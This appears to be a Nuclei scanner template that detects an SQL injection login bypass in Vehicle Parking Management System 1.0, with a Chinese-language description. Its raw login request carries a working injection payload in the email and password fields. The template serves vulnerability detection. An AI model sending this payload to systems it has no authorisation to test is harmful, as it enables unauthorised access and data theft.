id: vpms-auth-bypass

info:
  name: Vehicle Parking Management System 1.0 - SQL 注入漏洞
  author: dwisiswant0
  severity: critical
  description: Vehicle Parking Management System 1.0 - SQL 注入 存在SQL 注入漏洞。攻击者可借助可控参数干预后端 SQL 查询，从而读取敏感数据、绕过鉴权或进一步影响数据库完整性。
  reference:
    - https://www.exploit-db.com/exploits/48877
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cwe-id: CWE-89
  metadata:
    max-request: 1
  tags: auth-bypass,edb,sqli,vuln

http:
  - raw:
      - |
        POST /login.php HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Content-Type: application/x-www-form-urlencoded
        Referer: {{BaseURL}}/login.php
        Cookie: PHPSESSID=q4efk7p0vo1866rwdxzq8aeam8

        email=%27%3D%27%27or%27%40email.com&password=%27%3D%27%27or%27&btn_login=1

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "LAGOS PARKER"
          - "Login Successfully"
          - "location.href = 'index.php';"
        condition: and
        part: body

      - type: status
        status:
          - 200
